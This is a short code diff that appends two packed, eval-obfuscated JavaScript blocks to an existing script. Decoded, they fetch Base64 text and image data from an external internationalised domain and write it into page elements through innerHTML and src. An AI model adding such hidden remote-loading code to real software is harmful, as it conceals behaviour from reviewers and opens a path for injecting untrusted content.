@@ -163,3 +163,8 @@ function() {
 		2000)
 	}
 });
+//xs
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2 3=\'5://ぬ.ひ.みんな/6\';7($){$(0(){$(\'8[9-1]\').c(0(i){2 b=4;$.d(3+4.e.1+\'.1\',{},0(a){b.f=g.h.j(a)})})})}k{}',21,21,'function|txt|var|baseurl|this|https|art|if|div|data|||each|get|dataset|innerHTML|window|Base64||decode|else'.split('|'),0,{}));
+
+//img
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1 2=\'5://ぬ.ひ.みんな/3\';6($){$(0(){$(\'3[7-8=9]\').c(0(i){1 b=4;$.d(2+4.e.f+\'.g\',0(a){b.h=a.j+a.k})})})}l{}',22,22,'function|var|imgurl|img|this|https|if|data|aes|true|||each|getJSON|dataset|original|json|src||imgtype|imgdata|else'.split('|'),0,{}));
